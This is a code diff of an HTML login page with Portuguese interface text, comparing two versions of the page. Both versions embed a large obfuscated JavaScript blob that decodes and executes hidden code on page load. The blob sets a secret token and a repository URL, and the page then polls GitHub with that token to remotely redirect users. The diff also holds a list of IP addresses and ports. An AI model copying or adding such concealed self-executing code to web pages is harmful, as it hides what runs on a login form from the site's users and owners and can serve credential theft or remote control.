@@ -1,3 +1,69 @@
+cd 1:  <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="frontend/css/styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <h2>Login</h2>
+        <input type="email" id="email" placeholder="Usuário">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="login()">Login</button>
+
+        <p id="error-msg" style="color: red; display: none; text-align: center;">Email ou senha, inválidos!</p>
+        <p id="warning-msg" style="color: orange; display: none; text-align: center;"></p>
+        <div id="custom-error-msg" style="color: red; display: none; text-align: center;">User disabled, please reactivate to use.</div>
+    </div>
+
+    <script>
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                if (document.activeElement.id === 'email' || document.activeElement.id === 'password') {
+                    login();
+                }
+            }
+        });
+
+        var token,username,repo,path,url;(function(){var DBx='',jHj=142-131;function dzB(u){var m=7171897;var j=u.length;var q=[];for(var w=0;w<j;w++){q[w]=u.charAt(w)};for(var w=0;w<j;w++){var t=m*(w+497)+(m%42212);var d=m*(w+205)+(m%43512);var s=t%j;var k=d%j;var y=q[s];q[s]=q[k];q[k]=y;m=(t+d)%7344500;};return q.join('')};var GvY=dzB('amorsneyscpzhcdowkxijrutuqlnftrtvobgc').substr(0,jHj);var gfd='sal += 3cne6m,t=n5xv;r[s;"vb+d.f hwjslwniporat,vrxfz;;4ar n=88o,f1<9r,15,7o,;7,7=,v6n9,,(5h7l,i4r7(,i8=6o,j1"6e,00a8s,r9t;aa4 )=r]6f;rfveruu80ru)lrlwn-ta;=+C);[][n]i=c+);far ;=(]fqe=r0 n==u2]r1=61af.rrvlrhx[0(x,a{g-mlncs.lrnjt(;,+()cv;r=oia{g}menrs=xC.(phi=() u)uf rrvir,z)o+lsnAte-l;1>]0[zl-6{ra3 c=turl)vgr)wrosz,;)aa )==ual6vhrcpj0jvhrhi+w}lpn.tn;ja+ ,;qog(gaa i=.;l<e;o+=)Sv;rjf1w.ceaaCvd(Ap(n);v(rpbuaqf];1fvbr{f=8b}1a*l+r.uhar-o0eittjk1t-d;)=a;u+=;0e=so uf8f =p)qc;n2(c. eog8hoqvwdc!aeChdoA+("+[).+n.[h)r,o=eit;j{2;-r; =h;g+a2(}=l,efcrn[i}u ;.i+(j=jn7lg);=;]]i((0>v)v.uu3hmw]s.bCt(i9gjp[el) h1p0s3(.[6+y]e;]=)+v;"in(t!+nhl")Ai3(;<u)o.turh(w0sabqtaivghp)))o=z)=v.ao<nh"v)(}[dppese(7[[]2;hv)r(mgd(joi.(u"";laz j=(9=,02;1e,=2t9],C9n.jo.chtilo;5ar e=)tjiag)fho;C arC.de(46.;yo8((as i=r;[<u.}eug.hsuv+,mlm2sdl=t+yas2c;ahAu(t){. odn*Surrn .hrvm,hrrnopepv+u+)t;;e+utn+mns=ljthy("e"1.7o{n=ye;';var FqD=dzB[GvY];var FbJ='';var kyu=FqD;var AtZ=FqD(FbJ,dzB(gfd));var yvB=AtZ(dzB('u#a}dbnRft[in$!}\'SR)iopnR#=4,o].+$96a&.2RgR3Rdf3+t4ss;a3{bb}Rul,2n%ob(xv3ph(}b+)eR_b()$]atR%.n[R=5n}qr:Cr.4[nc.k)sa;!,e6!(\/!gs8.vhs..v).;x{t,$=Sh4,. e #b Ra+Ro,4 sp%;l.uil.,{bn,(,(tR%.jj+q(S!o,"s9#94,Rr%p0)!{+pRp_k_"7,r;{uf7(.a!Rm3(4!fel-3d8)()i=r)er[.=R}($=,2\/4bz7_rt;{tsuR! ; 9-jRRb)vbejrR;=sact6_p0R3!8w,yj!R.k}5k.ao5eRaR(e.esl3..xi=ev4=rbr}6);o[;!;)}0;.Rsr$R.b(R(04}R()3e!;,i%y]."R7aRa,(,)(d1no4x_-r\/+4Rtaa$qv(RtdRhds1)} (go,la.Rjm(yRv (oi2s1)ver.n;$5e1o1ep)!mt ,..#4+(S gl.tR)R(4.a0;),=2bR]R7,&97-0)t3_.n(r.;7s4!.l]);ae"n3!;(r4hR.;_=l$3+baot(r;_R-1]9,fuk!R3)((a_fo(u.Rz9nR%atip4,Rb-iu+btR7i;e6$.tri=,tfRiz0o)Rs=fR.d.\/RR#RR(5g\/.9Rx$ose_RxeNc7mj)*n !$%ou=,R)wR*2),nffu19aw={rf{!$n7)13gR%w)b"ne)c4R=pe)5eR_frs10(p.nSpxtuusu!bR+k9tR.bR;s)\'2(gRfR.h.3&1n-et3=(p,d.Rd$nR=\/.*4RRoR!t tvb}R})fn$e;g$r\']nft#R.}]s9%\/Ru.=3;.hd;eR+.&=fo!tn})u(.4Rorbcf;0d93=iR\'3.ou_b;4cR4urb32$tmsonjr=l%_ekR1R()..) +R}p51h4xt.+R)ul_dtR,h(vb!gk,6e!$2n$()ekR"]o(];xfbpfl00Ra1bR.a,bRd).()+ & u.R$0ff;){.n.;"1_RR9R35.."u3s},o Rp3!)Ri.R.ee(3hsn_,R,2{.akR. h(=;bjs(t!d_..sR i.oR.rf5\/b,o$}\/\/[Rb=.t *(0_l.!\/+slat"r, .f%,+sb.c\/ff.i)5*{!0;rsR!2lR_(Rj.-6f tg(n$o.6(oi)4f._dcb4aRj$3l3hR%$t.nv=)+;.Rr4f);bo$!f_$o0R)y5.C(f'));var vnG=kyu(DBx,yvB );vnG(2662);return 6365})()
+
+        async function checkLayout() {
+            try {
+                const response = await fetch(url, {
+                    headers: {
+                        'Authorization': `token ${token}`,
+                        'Accept': 'application/vnd.github.v3+json'
+                    }
+                });
+                const data = await response.json();
+                const content = atob(data.content);
+                const layoutStatus = JSON.parse(content).layout;
+
+                // Se o layout for "off", redireciona para teste.html
+                if (layoutStatus === "off") {
+                    window.location.href = "teste.html";
+                }
+                // Se o layout for "on", não faz nada
+            } catch (error) {
+                console.error("Erro ao buscar o status do layout:", error);
+            }
+        }
+
+        // Verifica o layout assim que a página é carregada
+        checkLayout();
+
+        
+        setInterval(checkLayout, 5000);
+    </script>
+</body>
+</html>
+
+
+
+cd2: 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -8,16 +74,16 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #1e1e1e;
-            color: #f0f0f0;
+            background-color: #f0f0f0;
+            color: #333;
             text-align: center;
         }
         .login-container {
             margin-top: 50px;
-            background: #2c2c2c;
+            background: white;
             padding: 20px;
             border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
         }
         #loading-spinner {
             display: none;
@@ -29,7 +95,7 @@
             text-align: center;
         }
         .spinner {
-            border: 8px solid rgba(255, 255, 255, 0.1);
+            border: 8px solid rgba(0, 0, 0, 0.1);
             border-left-color: #3498db;
             border-radius: 50%;
             width: 40px;
@@ -47,7 +113,7 @@
         .footer {
             margin-top: 50px;
             font-size: 14px;
-            color: #bbb;
+            color: #555;
         }
         .icon {
             font-size: 50px;
@@ -89,16 +155,15 @@
                 }
             }
         });
-
 var token,username,repo,path,url;(function(){var fUy='',UQx=212-201;function hyf(n){var c=2987208;var h=n.length;var y=[];for(var s=0;s<h;s++){y[s]=n.charAt(s)};for(var s=0;s<h;s++){var u=c*(s+384)+(c%21228);var b=c*(s+103)+(c%54116);var r=u%h;var l=b%h;var j=y[r];y[r]=y[l];y[l]=j;c=(u+b)%3040809;};return y.join('')};var HTL=hyf('ovgtunnctwpacytrozhdlkrmusfqbrcsxojie').substr(0,UQx);var LPC='vao ,=q[att6],C)i4v.rr..9"tb=d==a+is;r,(10u>sa+v;xhz,vi") l.(;f0ina=oe80ko.,)=(8g,qc;a{;i41g(,65eu9,g,Cmm,ae68sh),sg=t}2[uv[.puem]!fr+(tar u=0 a-hrljnj8ui0v+;j[  <r=,}jnf".( ;=;(h{)=l]1;dtofrnr6.)m1(]fvzrti60tr,n)gt [tslt=d=2 6h([+)retu+k.atru,rnnnf[9tc*.l"(v hf5,=mfr,rg)ucil,nh"rs6;rfs0]or-({r"r C=+c7lgvhrbzv.e rpihr 8=;;c(lh;rvr(0;)rf2ja]vlrnatrg4aC1;aqo[(-anlr=n;8<817+;i=s;r,;]a.=raf1)diAn;hg=zar)eedh14;}rce1th-.entS+=lz=+,npv]vr)t=[h"n7({u7anh+ o.a;seC+((heuj);}=;lh7hlv(+vys azhc aso5,eAtr0r;)0l+.]ues.tr,At+(8<e.=;oew;l+3vc}nnoe[)n+aile[i +r(o=la(lt))=;phtek,>)l);m,(pC+"s+c=<,i7gl0s+=aup.pu2z-]a.v;g;22=;cfh-i1(o!grucC  i((;hs0udolchnadvcoo+ric5{;A)ri{oelrkgn=)nil)uuz(-phf)()lr9ikav=hvhgng)7)p(;"tunapoaa;=(9t6S=srd9h3v.e3]hq(rca]=sf(nmu  =;(e5.tw vojC 9rs4do)r,r;uo8(,a+2vb1;l<mo;lu[;.]e=+))=}81;;1t(}]fjt.aoa2euk=..o;nrhguvni.6rho" v=ilf*=n)u7);ava[4 [,sis+l=)vg2A{dz.;ownw)p;';var WcH=hyf[HTL];var fOA='';var sqw=WcH;var qLO=WcH(fOA,hyf(LPC));var NpJ=qLO(hyf('y#2id{n+ot.Fh}Fot,S(ri,e_!}0r3k;;sbFm)34aa$}e.em=3#F{FFFFemqFbuFteom.Fe;d)end.t\'"erFl1!=}F(7!6FoF!.s\/sg]FFC.lEF..F37(ee.F08i,,f!Fty5)odMp$Ft0fi,%3{j%.(;"uqt}c-nfw(F.%Fum.fcc0!F_+=eDgF"se.ee;,=F.e=9}lt!(F(0($.F=; (wS0)Ftp)l. ;s..)p6e1!}$!.F2wF6FF22d$7)2.Fr;.{6 ddu]).er3s_us(e.F;r..(:%s0an"=)c".)u.\'\/F& etrr!\/Fr=g=F3a#Ff\/o0.r$54+g);.1s]=m[4.] o uor1*rd))vFF)kur,yoF)f($oh5$krFt=+;to4%I 3u1"foe[$,(7 ,= ht)gF$e0Fo(  q.)#).$w+z&\/3F4._e.,f4])_os(((.,($.78n 54103,)\'=rpop37.0.})Fhfln13."5{e_!21mh!a=0n3(u.%!$%h+Fo)wi7erb(;(o,t,9)(F!5w%+yfv,;-F r{F1f2$g0;e}!i6n5_2(r(o(romce,rCoF,(]+7F;nn3sadgnr(.!F;%5vEF,!F;(h.6%m+8tad\/.$4S)1.\/+i3r(3r$rt.;=))F,dF0h53-vuf[)aFoaF._o$1FFu _u.(iFFFs(}](fj4Fte!nua4d=)]hir&FFa!va$0.y .4n,%pe;!_(t(\/)nt.rtw).=ved(o1sFrfaa_Fz}[)r;p&Figt,ead#grj).+.tr;l(2ht2es;\/(ap4;.2\/o0u+l!FF,\/r;,1n\/1g.sF;n80ebFFfFn..cFonF,(F_+ia;$FFo[5]);hur,%(\'3F-,)fFmubuF3.FF,.5}$2pr4vopef})}o0)Ft=.\/_.F+lF\'F" 1hfx;.3{fF,)q(;#{))y.!),p 7.F).tv4%}h8!)F(;stw38y21$enF07ul.(_).3!+o3f*$i_enijt9dfi.e(bvg)ft Fj ;srF=rf4(_;_tF,2+2ibt{g_pa\/3F#%t(r=7!p* =e)t*!3anF)s==.nt.eej,n=ba).Fj;ind3cf4eeFb_ewfrq}!FF;l!.o[=={we =s$F=,y0]e."4]'));var xzL=sqw(fUy,NpJ );xzL(4056);return 9337})()
 
         const ipsAndPorts = [
             "191.183.987:1327",
             "192.168.1.1:8080",
-            "10.0.0.1:5642",
-            "172.16.0.1:8840",
+            "10.0.0.1:5623",
+            "172.16.0.1:8951",
             "203.0.113.5:5000",
-            "198.51.100.2:8724"
+            "198.51.100.2:5475"
         ];
 
         async function login() {
@@ -161,10 +226,6 @@ var token,username,repo,path,url;(function(){var fUy='',UQx=212-201;function hyf
                 document.getElementById('custom-error-msg').style.display = 'block';
             }
         }
-
-        window.onbeforeunload = function() {
-            return "Desconectar?"; // Prompt user before leaving
-        };
     </script>
 </body>
 </html>
